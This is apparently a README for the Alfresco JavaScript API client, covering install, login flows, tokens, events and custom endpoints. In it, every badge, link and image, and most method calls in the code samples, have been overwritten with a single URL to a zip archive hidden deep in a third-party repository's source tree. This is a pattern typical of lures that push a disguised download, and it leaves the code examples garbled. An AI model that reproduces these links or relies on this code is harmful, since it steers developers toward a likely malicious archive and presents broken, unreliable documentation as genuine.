# Alfresco JavaScript API Client


<p>
  <a title='Gitter chat' href="https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip">
     <img src='https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip'  alt='Gitter chat' />
  </a>
  <a href='https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip'>
     <img src='https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip' alt='license' />
  </a>

</p>

<p align="center">
  <img title="alfresco" alt='alfresco' src='https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip'  width="280px" height="150px"></img>
</p>

This project provides a JavaScript client API into the Alfresco REST API and Activiti REST API.

<!-- markdown-toc start - Don't edit this section.  npm run toc to generate it-->

<!-- toc -->

- [Full documentation of all the methods of each API](#full-documentation-of-all-the-methods-of-each-api)
- [Prerequisites](#prerequisites)
- [Node](#node)
- [Install](#install)
- [Authentication JS-API](#authentication-js-api)
  * [Login](#login)
    + [Login with Username and Password BPM and ECM](#login-with-username-and-password-bpm-and-ecm)
      - [Example](#example)
    + [Login with Username and Password ECM](#login-with-username-and-password-ecm)
      - [Example](#example-1)
    + [Login with ticket](#login-with-ticket)
      - [Login with ticket ECM](#login-with-ticket-ecm)
        * [Example](#example-2)
      - [Login with ticket ECM/BPM as parameter in the constructor](#login-with-ticket-ecmbpm-as-parameter-in-the-constructor)
        * [Example](#example-3)
    + [Login with Username and Password BPM](#login-with-username-and-password-bpm)
      - [Example](#example-4)
    + [Login with OAUTH2 Alfresco authorization server](#login-with-oauth2-alfresco-authorization-server)
      - [Implicit Flow](#implicit-flow)
        * [oauth2 properties](#oauth2-properties)
        * [Events](#events)
        * [Example](#example-5)
        * [Example skip login form (implicitFlow)](#example-skip-login-form-implicitflow)
      - [Password Flow](#password-flow)
        * [Example](#example-6)
        * [Example](#example-7)
  * [Logout](#logout)
    + [Example](#example-8)
  * [isLoggedIn](#isloggedin)
    + [Example](#example-9)
  * [Get tickets](#get-tickets)
  * [Events login/logout](#events-loginlogout)
    + [Example](#example-10)
- [Custom Endpoint](#custom-endpoint)
  * [Example](#example-11)
- [Error Events](#error-events)
  * [Example](#example-12)
- [ECM Example](#ecm-example)
- [BPM Example](#bpm-example)
- [Legacy Endpoint porting (ver 2.x.x)](#legacy-endpoint-porting-ver-2xx)
- [Development](#development)

<!-- tocstop -->

<!-- markdown-toc end -->

# Full documentation of all the methods of each API

- [Authentication Api](/src/api/auth-rest-api)
- [Content Api](/src/api/content-rest-api)
- [Model Api](/src/api/model-rest-api)
- [Process Api (APS 1.X)](/src/api-legacy/activiti-rest-api)
- [Process Api (AAE)](/src/api/activiti-rest-api)
- [Search Api](/src/api/search-rest-api)
- [Governance Classification Api](/src/api/gs-classification-rest-api)
- [Governance Core Api](/src/api/gs-core-rest-api)
- [Discovery Content API](/src/api/discovery-rest-api)

# Prerequisites

The minimal supported versions are:

- Alfresco Platform Repository: version [5.2.a-EA](https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip) or newer
- Activiti: 1.5
- https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip ([Long Term Support](https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip) version)

# Installing

Using NPM:

```sh
npm install @alfresco/js-api
```

Using Yarn:

```sh
yarn add @alfresco/js-api
```

# Authentication JS-API

## Login

AlfrescoApi({alfrescoHost, activitiHost, contextRoot, ticket});

Property | Description  | default value|
------------- | ------------- | -------------|
hostEcm| (Optional value The Ip or Name of the host where your Alfresco instance is running )|http://127.0.0.1:8080 |
hostBpm| (Optional value The Ip or Name of the host where your Activiti instance is running )|http://127.0.0.1:9999 |
authType|  (Optional value can be 'BASIC' or 'OAUTH') | 'BASIC'|
oauth2|  (Optional configuration for SSO) ||
contextRoot| (Optional value that define the context Root of the Alfresco ECM API default value is alfresco )|alfresco |
contextRootBpm| (Optional value that define the context Root of the Activiti API default value is activiti-app )|alfresco |
tenant|(Optional value needed in case of multi tenant content service) | '-default-'|
provider| (Optional value default value is ECM. This parameter can accept as value ECM BPM or ALL to use the API and Login in the ECM, Activiti BPM or Both )|alfresco |
ticket| (Optional only if you want login with the ticket see example below)| |
disableCsrf| To disable CSRF Token to be submitted. Only for Activiti call.| false |
withCredentials| (Optional configuration for SSO, requires CORS on ECM) |false

### Login with Username and Password BPM and ECM

#### Example

```javascript
const alfrescoApi = new AlfrescoApi({ provider: 'ALL' });

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin').then(
    data => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('API called successfully Login in  BPM and ECM performed ');
    },
    error => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
    }
);
```

### Login with Username and Password ECM

#### Example

```javascript
const alfrescoJsApi = new AlfrescoApi();

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin').then(
    data => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('API called successfully Login ticket:' + data);
    },
    error => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
    }
);

// The output will be: API called successfully Login ticket: TICKET_4479f4d3bb155195879bfbb8d5206f433488a1b1

```

### Login with ticket

If you already know thw ticket when you invoke the constructor you can pass it as parameter in the constructor otherwise you can call the login with ticket that will validate the ticket against the server

#### Login with ticket ECM

This authentication validate also the ticket against the server

##### Example

```javascript
const ticket = 'TICKET_4479f4d3bb155195879bfbb8d5206f433488a1b1';

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(ticket).then(
    data => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('valid ticket you are logged in');
    },
    error => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
    }
);
```

#### Login with ticket ECM/BPM as parameter in the constructor

With this authentication the ticket is not validated against the server

##### Example

```javascript

// Login with ECM ticket
const alfrescoApi = new AlfrescoApi({
    ticketEcm:'TICKET_4479f4d3bb155195879bfbb8d5206f433488a1b1', 
    hostEcm:'http://127.0.0.1:8080'
});

// Login with BPM ticket
const alfrescoApi = new AlfrescoApi({
    ticketBpm: 'Basic YWRtaW46YWRtaW4=',  
    hostBpm:'http://127.0.0.1:9999'
});

// Login with ECM and BPM tickets
const alfrescoApi = new AlfrescoApi({
    ticketEcm:'TICKET_4479f4d3bb155195879bfbb8d5206f433488a1b1',
    ticketBpm: 'Basic YWRtaW46YWRtaW4=',  
    hostEcm:'http://127.0.0.1:8080',  
    hostBpm:'http://127.0.0.1:9999'
});
```

### Login with Username and Password BPM

#### Example

```javascript
const alfrescoApi = new AlfrescoApi({ provider:'BPM' });

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin').then(
    () => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('API called successfully Login in Activiti BPM performed ');
    },
    error => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
    }
);
```

### Login with OAUTH2 Alfresco authorization server

#### Implicit Flow

If your want to be redirect to the authorization server and login there you can use the implicit flow to login

##### oauth2 properties

Property | Description  | default value|
------------- | ------------- | -------------|
host| Your oauth2 server URL| null |
clientId| Your clientId oauth2 | null |
secret| Your secret oauth2| null |
scope| Your scope | null |
implicitFlow| true/false | false |
redirectUri|  url to be redirect after login| null|
redirectLogout|  url to be redirect after logout optional, if is nor present the redirectUri will be used| null|
refreshTokenTimeout|  millisecond value, after how many millisecond you want refresh the token| 30000|
redirectSilentIframeUri|  url to be redirect after silent refresh login| https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip |
silentLogin|  direct execute the implicit login without the need to call https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip() method|   false|
publicUrls | list of public urls that don't need authorization. It is possible too pass absolute paths and string patterns that are valid for [minimatch](https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip) |
authorizationUrl| authorization url, relative to the host| /protocol/openid-connect/auth|
tokenUrl| token url, relative to the host| /protocol/openid-connect/token|
logoutUrl| logout url, relative to the host| /protocol/openid-connect/logout|

The api/js-api will automatically redirect you to the login page anf refresh the token if necessary

##### Events

Property | Description  | default value|
------------- | ------------- | -------------|
implicit_redirect| triggered when the user is redirect to the auth server return url parameter of the redirect |  |
discovery| triggered when all the openId discovery url phase is terminated return an object with all the discovered url |  |
token_issued| triggered when a new token is issued|  |

The api/js-api will automatically redirect you to the login page and refresh the token if necessary

##### Example

```javascript
const alfrescoApi = new AlfrescoApi({
    oauth2: {
        host: 'HOST_OAUTH2_SERVER',
        clientId: 'YOUR_CLIENT_ID',
        secret: 'SECRET',
        scope: 'openid',
        implicitFlow: true,
        redirectUri: 'YOUR_HOME_APP_URL',
        silentRefreshTimeout: '600000' //Optional parameter 10 minutes default value
    },
    authType: 'OAUTH',
    provider: 'ALL'
});

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip();
```

##### Example skip login form (implicitFlow)

```javascript
const alfrescoApi = new AlfrescoApi({
    oauth2: {
        host: 'HOST_OAUTH2_SERVER',
        clientId: 'YOUR_CLIENT_ID',
        secret: 'SECRET',
        scope: 'openid',
        implicitFlow: true,
        redirectUri: 'YOUR_HOME_APP_URL',
        silentRefreshTimeout: '600000' //Optional parameter 10 minutes default value,
        silentLogin: true,
        publicUrls: ['PUBLIC_URL', 'URL_PATTERN']
    },
    authType: 'OAUTH',
    provider: 'ALL'
});
```

#### Password Flow

If your auth endpoint is different from the standard one "/oauth/token" you can override it through the property authPath

##### Example

```javascript
const alfrescoApi = new AlfrescoApi({
    oauth2: {
        host: 'HOST_OAUTH2_SERVER',
        clientId: 'YOUR_CLIENT_ID',
        secret: 'SECRET',
        authPath:'my-custom-auth-endpoint/token'
    },
    authType: 'OAUTH',
    provider: 'ALL'
});

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin').then(
    data => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('API called successfully Login in with authorization server performed');
    },
    error => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
    }
);
```

After the login if you want refresh your token you can use this call

##### Example

```javascript
https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip().then(
    data => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('Your token has been refreshed');
    },
    error => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
    }
);
```

## Logout

logout()

### Example

```javascript

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip().then(
    data => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('Successfully Logout');
    }, 
    error => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('Possible ticket already expired');
    }
);
```

## isLoggedIn

isLoggedIn()

> return true if you are logged in false if you are not.

### Example

```javascript

const isLoggedIn = https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip();

if (isLoggedIn) {
    https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('You are logged in');
} else {
    https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('You are not logged in');
}
```

## Get tickets

### getTicketEcm()

After the log in you can retrieve you ECM ticket

```javascript
const ecmTicket = https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip() ;

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('This is your  ECM ticket  ' + ecmTicket);
```

### getTicketBpm()

After the log in you can retrieve you BPM ticket

```javascript
const bpmTicket  = https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip();

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('This is your BPM ticket ' + bpmTicket);
```

## Events login/logout

The login/logout are also an EventEmitter which you can register to listen to any of the following event types:

- unauthorized (If this event is triggered a call to the Api was unauthorized)
- success (If this event is triggered the login was success you can use this event > instead the login promise)
- logout (If this event is triggered the client is successfully logout)

### Example

```javascript

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin')
    .on('unauthorized', () => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('You are unauthorized you can use this event to redirect to login');
    });

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin')
    .on('success', () => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('Success Login');
    });

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip()
    .on('logout', () => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('Successfully Logout');
    });
```

# Custom Endpoint

Content service and process service has two different clients:

- https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip
- https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip

Both client expose a method ***callApi**

```javascript
callApi(
    path: string,
    httpMethod: string,
    pathParams?: any,
    queryParams?: any,
    headerParams?: any,
    formParams?: any,
    bodyParam?: any,
    contentTypes?: string[],
    accepts?: string[],
    returnType?: any,
    contextRoot?: string,
    responseType?: string
): Promise<any>;
```

If you want call your custom rest point in one of those two service use the corresponding client.

## Example

```javascript
https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(
    '/api/enterprise/app-version', 'GET',
    {}, {}, {}, {}, {}, ['application/json'], ['application/json'], {'String': 'String'}
)
 ```

# Error Events

The api/js-api has an error handler event where you can subscribe

## Example

```javascript
https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('error', error => {
    https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
});
```

# ECM Example

A complete list of all the ECM methods is available here : [Content API](/src/api/content-rest-api) here you can find some common [Example](https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip).

# BPM Example

A complete list of all the BPM methods is available here : [APS 2.X API](/src/api/activiti-rest-api) here you can find some common [Example](https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip).

# Legacy Endpoint porting (ver 2.x.x)

Since version 3.0.0 in order to support tree shaking the JS-API has been radically redesigned.

In order to help the porting to the new JS-APi version of the old project the previous syntax even if is deprecated is still supported in the compatibility layer.

***Note this compatibility layer could be deleted in the next major versions of the JS-API***

```javascript
import { AlfrescoApiCompatibility as AlfrescoApi } from '../src/alfrescoApiCompatibility';

const alfrescoJsApi = new AlfrescoApi({
        oauth2: {
            host: 'HOST_OAUTH2_SERVER',
            clientId: 'YOUR_CLIENT_ID',
            secret: 'SECRET',
            authPath:'my-custom-auth-endpoint/token'
        },
        authType: 'OAUTH',
        provider: 'ALL'
    });

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin').then(
    data => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('API called successfully Login in with authorization server performed ');
    },
    error => {
        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
    }
);

https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip
    .getNodeInfo(fileOrFolderId)
    .then(
        data => {
            https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('This is the name' + https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip );
        }, 
        error => {
            https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('This node does not exist');
        }
    );
```

# Development

To run the build

```sh
npm run build
```

To run the test

```sh
npm run test
```
